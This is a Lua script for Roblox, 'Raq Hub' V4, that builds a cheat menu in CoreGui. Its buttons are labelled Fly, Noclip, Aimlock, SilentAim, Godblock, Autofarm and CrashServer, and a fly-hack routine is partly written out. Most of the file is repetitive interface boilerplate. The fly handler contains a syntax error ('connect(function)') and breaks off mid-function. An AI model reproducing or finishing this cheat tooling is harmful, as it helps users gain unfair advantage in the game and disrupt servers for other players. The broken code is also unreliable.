-- rqazaa#0001
-- V4

-- Instances:

local RaqHub = Instance.new("ScreenGui")
local Loading = Instance.new("ImageLabel")
local Title1 = Instance.new("TextLabel")
local _1holder1 = Instance.new("TextLabel")
local _1holder1_Roundify_12px = Instance.new("ImageLabel")
local Close = Instance.new("TextButton")
local Loading_2 = Instance.new("TextLabel")
local Main = Instance.new("ImageLabel")
local TEXT = Instance.new("TextLabel")
local ButtonsMain = Instance.new("ScrollingFrame")
local Hxolder = Instance.new("TextLabel")
local Hxolder_Roundify_12px = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_2 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_3 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_4 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_5 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_6 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_7 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_8 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_9 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_10 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_11 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_12 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_13 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_14 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_15 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_16 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_17 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_18 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_19 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_20 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_21 = Instance.new("ImageLabel")
local Hxolder_Roundify_12px_22 = Instance.new("ImageLabel")
local Fly = Instance.new("TextButton")
local FOV = Instance.new("TextButton")
local Noclip = Instance.new("TextButton")
local Aimlock = Instance.new("TextButton")
local Godblock = Instance.new("TextButton")
local Autofarm = Instance.new("TextButton")
local BOOSTFPS = Instance.new("TextButton")
local CrashServer = Instance.new("TextButton")
local Autodrop = Instance.new("TextButton")
local FistReach = Instance.new("TextButton")
local KittenAssist = Instance.new("TextButton")
local SilentAim = Instance.new("TextButton")
local ModFly = Instance.new("TextButton")
local Freecam = Instance.new("TextButton")
local Btools = Instance.new("TextButton")
local AnimChanger = Instance.new("TextButton")
local InfJump = Instance.new("TextButton")
local TeleportUi = Instance.new("TextButton")
local TeleportUi_2 = Instance.new("TextButton")
local Close_2 = Instance.new("TextButton")

--Properties:

RaqHub.Name = "RaqHub"
RaqHub.Parent = game.CoreGui
RaqHub.ResetOnSpawn = false

Loading.Name = "Loading"
Loading.Parent = RaqHub
Loading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Loading.BackgroundTransparency = 1.000
Loading.Position = UDim2.new(0.733770967, 0, 0.758045316, 0)
Loading.Size = UDim2.new(0, 365, 0, 203)
Loading.Image = "rbxassetid://3570695787"
Loading.ImageColor3 = Color3.fromRGB(44, 44, 44)
Loading.ScaleType = Enum.ScaleType.Slice
Loading.SliceCenter = Rect.new(100, 100, 100, 100)
Loading.SliceScale = 0.120

Title1.Name = "Title1"
Title1.Parent = Loading
Title1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title1.BackgroundTransparency = 1.000
Title1.Size = UDim2.new(0, 365, 0, 42)
Title1.Font = Enum.Font.GothamBlack
Title1.Text = "Raq Hub -Loading"
Title1.TextColor3 = Color3.fromRGB(0, 0, 0)
Title1.TextSize = 38.000

_1holder1.Name = "1holder1"
_1holder1.Parent = Loading
_1holder1.BackgroundColor3 = Color3.fromRGB(238, 0, 0)
_1holder1.BackgroundTransparency = 1.000
_1holder1.BorderSizePixel = 0
_1holder1.Position = UDim2.new(0.224657536, 0, 0.600985229, 0)
_1holder1.Size = UDim2.new(0, 200, 0, 50)
_1holder1.Font = Enum.Font.SourceSans
_1holder1.Text = " "
_1holder1.TextColor3 = Color3.fromRGB(0, 0, 0)
_1holder1.TextSize = 14.000

_1holder1_Roundify_12px.Name = "1holder1_Roundify_12px"
_1holder1_Roundify_12px.Parent = _1holder1
_1holder1_Roundify_12px.AnchorPoint = Vector2.new(0.5, 0.5)
_1holder1_Roundify_12px.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
_1holder1_Roundify_12px.BackgroundTransparency = 1.000
_1holder1_Roundify_12px.Position = UDim2.new(0.502499998, 0, 0.949999988, 0)
_1holder1_Roundify_12px.Size = UDim2.new(1.745, 0, 0.899999976, 0)
_1holder1_Roundify_12px.Image = "rbxassetid://3570695787"
_1holder1_Roundify_12px.ImageColor3 = Color3.fromRGB(238, 0, 0)
_1holder1_Roundify_12px.ScaleType = Enum.ScaleType.Slice
_1holder1_Roundify_12px.SliceCenter = Rect.new(100, 100, 100, 100)
_1holder1_Roundify_12px.SliceScale = 0.120

Close.Name = "Close"
Close.Parent = Loading
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.BackgroundTransparency = 1.000
Close.Position = UDim2.new(0.0219178088, 0, 0.724137902, 0)
Close.Size = UDim2.new(0, 349, 0, 45)
Close.Font = Enum.Font.GothamSemibold
Close.Text = "Destroy UI"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextSize = 46.000

Loading_2.Name = "Loading"
Loading_2.Parent = Loading
Loading_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Loading_2.BackgroundTransparency = 1.000
Loading_2.Position = UDim2.new(0.0493150651, 0, 0.413793147, 0)
Loading_2.Size = UDim2.new(0, 328, 0, 38)
Loading_2.Font = Enum.Font.GothamBlack
Loading_2.Text = "Loading"
Loading_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Loading_2.TextScaled = true
Loading_2.TextSize = 35.000
Loading_2.TextWrapped = true

Main.Name = "Main"
Main.Parent = RaqHub
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BackgroundTransparency = 1.000
Main.Position = UDim2.new(0.348650575, 0, 0.306317031, 0)
Main.Size = UDim2.new(0, 467, 0, 255)
Main.Visible = false
Main.Image = "rbxassetid://3570695787"
Main.ImageColor3 = Color3.fromRGB(44, 44, 44)
Main.ScaleType = Enum.ScaleType.Slice
Main.SliceCenter = Rect.new(100, 100, 100, 100)
Main.SliceScale = 0.120

TEXT.Name = "TEXT"
TEXT.Parent = Main
TEXT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TEXT.BackgroundTransparency = 1.000
TEXT.Size = UDim2.new(0, 467, 0, 49)
TEXT.Font = Enum.Font.GothamBlack
TEXT.Text = "Raq Hub"
TEXT.TextColor3 = Color3.fromRGB(0, 0, 0)
TEXT.TextSize = 38.000

ButtonsMain.Name = "ButtonsMain"
ButtonsMain.Parent = Main
ButtonsMain.Active = true
ButtonsMain.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
ButtonsMain.BorderSizePixel = 0
ButtonsMain.Position = UDim2.new(0.0149892932, 0, 0.192156866, 0)
ButtonsMain.Size = UDim2.new(0, 454, 0, 197)
ButtonsMain.ScrollBarThickness = 0

Hxolder.Name = "Hxolder"
Hxolder.Parent = ButtonsMain
Hxolder.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
Hxolder.BackgroundTransparency = 1.000
Hxolder.BorderSizePixel = 0
Hxolder.Position = UDim2.new(0.0837004483, 0, 0.0137254912, 0)
Hxolder.Size = UDim2.new(0, 200, 0, 50)
Hxolder.Font = Enum.Font.SourceSans
Hxolder.Text = " "
Hxolder.TextColor3 = Color3.fromRGB(0, 0, 0)
Hxolder.TextSize = 14.000

Hxolder_Roundify_12px.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px.Parent = Hxolder
Hxolder_Roundify_12px.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px.BackgroundTransparency = 1.000
Hxolder_Roundify_12px.Position = UDim2.new(0.352499992, 0, 0.379999995, 0)
Hxolder_Roundify_12px.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px.SliceScale = 0.120

Hxolder_Roundify_12px_2.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_2.Parent = Hxolder
Hxolder_Roundify_12px_2.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_2.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_2.Position = UDim2.new(1.53249991, 0, 0.379999995, 0)
Hxolder_Roundify_12px_2.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_2.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_2.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_2.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_2.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_2.SliceScale = 0.120

Hxolder_Roundify_12px_3.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_3.Parent = Hxolder
Hxolder_Roundify_12px_3.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_3.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_3.Position = UDim2.new(0.352499992, 0, 1.36000001, 0)
Hxolder_Roundify_12px_3.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_3.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_3.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_3.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_3.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_3.SliceScale = 0.120

Hxolder_Roundify_12px_4.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_4.Parent = Hxolder
Hxolder_Roundify_12px_4.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_4.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_4.Position = UDim2.new(0.352499992, 0, 2.36000013, 0)
Hxolder_Roundify_12px_4.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_4.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_4.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_4.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_4.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_4.SliceScale = 0.120

Hxolder_Roundify_12px_5.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_5.Parent = Hxolder
Hxolder_Roundify_12px_5.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_5.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_5.Position = UDim2.new(0.352499992, 0, 3.30000019, 0)
Hxolder_Roundify_12px_5.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_5.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_5.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_5.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_5.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_5.SliceScale = 0.120

Hxolder_Roundify_12px_6.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_6.Parent = Hxolder
Hxolder_Roundify_12px_6.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_6.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_6.Position = UDim2.new(0.352499992, 0, 4.28000021, 0)
Hxolder_Roundify_12px_6.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_6.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_6.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_6.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_6.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_6.SliceScale = 0.120

Hxolder_Roundify_12px_7.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_7.Parent = Hxolder
Hxolder_Roundify_12px_7.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_7.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_7.Position = UDim2.new(0.352499992, 0, 5.26000023, 0)
Hxolder_Roundify_12px_7.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_7.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_7.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_7.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_7.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_7.SliceScale = 0.120

Hxolder_Roundify_12px_8.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_8.Parent = Hxolder
Hxolder_Roundify_12px_8.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_8.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_8.Position = UDim2.new(0.352499992, 0, 6.18000031, 0)
Hxolder_Roundify_12px_8.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_8.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_8.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_8.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_8.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_8.SliceScale = 0.120

Hxolder_Roundify_12px_9.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_9.Parent = Hxolder
Hxolder_Roundify_12px_9.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_9.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_9.Position = UDim2.new(0.352499992, 0, 7.16000032, 0)
Hxolder_Roundify_12px_9.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_9.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_9.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_9.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_9.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_9.SliceScale = 0.120

Hxolder_Roundify_12px_10.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_10.Parent = Hxolder
Hxolder_Roundify_12px_10.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_10.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_10.Position = UDim2.new(0.352499992, 0, 8.07999992, 0)
Hxolder_Roundify_12px_10.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_10.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_10.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_10.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_10.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_10.SliceScale = 0.120

Hxolder_Roundify_12px_11.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_11.Parent = Hxolder
Hxolder_Roundify_12px_11.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_11.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_11.Position = UDim2.new(0.352499992, 0, 9.0199995, 0)
Hxolder_Roundify_12px_11.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_11.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_11.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_11.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_11.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_11.SliceScale = 0.120

Hxolder_Roundify_12px_12.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_12.Parent = Hxolder
Hxolder_Roundify_12px_12.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_12.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_12.Position = UDim2.new(0.352499992, 0, 10, 0)
Hxolder_Roundify_12px_12.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_12.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_12.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_12.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_12.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_12.SliceScale = 0.120

Hxolder_Roundify_12px_13.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_13.Parent = Hxolder
Hxolder_Roundify_12px_13.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_13.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_13.Position = UDim2.new(1.53249991, 0, 1.36000001, 0)
Hxolder_Roundify_12px_13.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_13.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_13.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_13.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_13.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_13.SliceScale = 0.120

Hxolder_Roundify_12px_14.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_14.Parent = Hxolder
Hxolder_Roundify_12px_14.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_14.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_14.Position = UDim2.new(1.53249991, 0, 2.36000013, 0)
Hxolder_Roundify_12px_14.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_14.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_14.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_14.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_14.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_14.SliceScale = 0.120

Hxolder_Roundify_12px_15.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_15.Parent = Hxolder
Hxolder_Roundify_12px_15.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_15.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_15.Position = UDim2.new(1.53249991, 0, 3.30000019, 0)
Hxolder_Roundify_12px_15.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_15.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_15.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_15.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_15.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_15.SliceScale = 0.120

Hxolder_Roundify_12px_16.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_16.Parent = Hxolder
Hxolder_Roundify_12px_16.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_16.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_16.Position = UDim2.new(1.53249991, 0, 4.28000021, 0)
Hxolder_Roundify_12px_16.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_16.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_16.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_16.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_16.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_16.SliceScale = 0.120

Hxolder_Roundify_12px_17.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_17.Parent = Hxolder
Hxolder_Roundify_12px_17.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_17.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_17.Position = UDim2.new(1.53249991, 0, 5.26000023, 0)
Hxolder_Roundify_12px_17.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_17.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_17.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_17.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_17.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_17.SliceScale = 0.120

Hxolder_Roundify_12px_18.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_18.Parent = Hxolder
Hxolder_Roundify_12px_18.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_18.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_18.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_18.Position = UDim2.new(1.53249991, 0, 6.18000031, 0)
Hxolder_Roundify_12px_18.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_18.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_18.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_18.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_18.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_18.SliceScale = 0.120

Hxolder_Roundify_12px_19.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_19.Parent = Hxolder
Hxolder_Roundify_12px_19.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_19.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_19.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_19.Position = UDim2.new(1.53249991, 0, 7.16000032, 0)
Hxolder_Roundify_12px_19.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_19.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_19.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_19.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_19.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_19.SliceScale = 0.120

Hxolder_Roundify_12px_20.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_20.Parent = Hxolder
Hxolder_Roundify_12px_20.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_20.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_20.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_20.Position = UDim2.new(1.53249991, 0, 8.06000042, 0)
Hxolder_Roundify_12px_20.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_20.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_20.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_20.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_20.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_20.SliceScale = 0.120

Hxolder_Roundify_12px_21.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_21.Parent = Hxolder
Hxolder_Roundify_12px_21.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_21.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_21.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_21.Position = UDim2.new(1.53249991, 0, 9, 0)
Hxolder_Roundify_12px_21.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_21.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_21.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_21.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_21.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_21.SliceScale = 0.120

Hxolder_Roundify_12px_22.Name = "Hxolder_Roundify_12px"
Hxolder_Roundify_12px_22.Parent = Hxolder
Hxolder_Roundify_12px_22.AnchorPoint = Vector2.new(0.5, 0.5)
Hxolder_Roundify_12px_22.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Hxolder_Roundify_12px_22.BackgroundTransparency = 1.000
Hxolder_Roundify_12px_22.Position = UDim2.new(1.53249991, 0, 10, 0)
Hxolder_Roundify_12px_22.Size = UDim2.new(1.08500028, 0, 0.75999999, 0)
Hxolder_Roundify_12px_22.Image = "rbxassetid://3570695787"
Hxolder_Roundify_12px_22.ImageColor3 = Color3.fromRGB(66, 66, 66)
Hxolder_Roundify_12px_22.ScaleType = Enum.ScaleType.Slice
Hxolder_Roundify_12px_22.SliceCenter = Rect.new(100, 100, 100, 100)
Hxolder_Roundify_12px_22.SliceScale = 0.120

Fly.Name = "Fly"
Fly.Parent = ButtonsMain
Fly.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Fly.BackgroundTransparency = 1.000
Fly.Position = UDim2.new(0, 0, 0.0120035838, 0)
Fly.Size = UDim2.new(0, 217, 0, 38)
Fly.Font = Enum.Font.GothamBold
Fly.Text = "Fly [X]"
Fly.TextColor3 = Color3.fromRGB(0, 0, 0)
Fly.TextSize = 30.000
Fly.MouseButton1Down:connect(function)
local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()

	localplayer = plr

	if workspace:FindFirstChild("Core") then
		workspace.Core:Destroy()
	end

	local Core = Instance.new("Part")
	Core.Name = "Core"
	Core.Size = Vector3.new(0.05, 0.05, 0.05)

	spawn(function()
		Core.Parent = workspace
		local Weld = Instance.new("Weld", Core)
		Weld.Part0 = Core
		Weld.Part1 = localplayer.Character.LowerTorso
		Weld.C0 = CFrame.new(0, 0, 0)
	end)

	workspace:WaitForChild("Core")

	local torso = workspace.Core
	flying = true
	local speed=10
	local keys={a=false,d=false,w=false,s=false}
	local e1
	local e2
	local function start()
		local pos = Instance.new("BodyPosition",torso)
		local gyro = Instance.new("BodyGyro",torso)
		pos.Name="EPIXPOS"
		pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
		pos.position = torso.Position
		gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		gyro.cframe = torso.CFrame
		repeat
			wait()
			localplayer.Character.Humanoid.PlatformStand=true
			local new=gyro.cframe - gyro.cframe.p + pos.position
			if not keys.w and not keys.s and not keys.a and not keys.d then
				speed=5
			end
			if keys.w then
				new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
				speed=speed+0
			end
			if keys.s then
				new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
				speed=speed+0
			end
			if keys.d then
				new = new * CFrame.new(speed,0,0)
				speed=speed+0
			end
			if keys.a then
				new = new * CFrame.new(-speed,0,0)
				speed=speed+0
			end
			if speed>10 then
				speed=5
			end
			pos.position=new.p
			if keys.w then
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
			elseif keys.s then
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
			else
				gyro.cframe = workspace.CurrentCamera.CoordinateFrame
			end
		until flying == false
		if gyro then gyro:Destroy() end
		if pos then pos:Destroy() end
		flying=false
